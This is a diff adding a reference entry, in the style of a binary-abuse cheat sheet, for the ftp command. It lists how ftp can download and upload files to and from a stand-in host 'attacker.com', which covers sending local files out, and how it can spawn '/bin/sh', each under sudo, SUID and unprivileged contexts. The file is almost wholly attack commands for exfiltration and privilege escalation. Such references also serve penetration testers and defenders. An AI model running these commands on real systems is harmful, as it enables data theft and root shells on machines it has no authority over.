@@ -1,0 +1,53 @@
+ftp
+===
+
+Download
+--------
+
+[Sudo]
+    ftp -a attacker.com
+get /path/to/input-file output-file
+    Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
+
+[SUID]
+    ftp -a attacker.com
+get /path/to/input-file output-file
+    Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
+
+[Unprivileged]
+    ftp -a attacker.com
+get /path/to/input-file output-file
+    Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
+
+Shell
+-----
+
+[Sudo]
+    ftp
+!/bin/sh
+
+[SUID]
+    ftp
+!/bin/sh
+
+[Unprivileged]
+    ftp
+!/bin/sh
+
+Upload
+------
+
+[Sudo]
+    ftp -a attacker.com
+put /path/to/input-file output-file
+    Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
+
+[SUID]
+    ftp -a attacker.com
+put /path/to/input-file output-file
+    Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
+
+[Unprivileged]
+    ftp -a attacker.com
+put /path/to/input-file output-file
+    Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
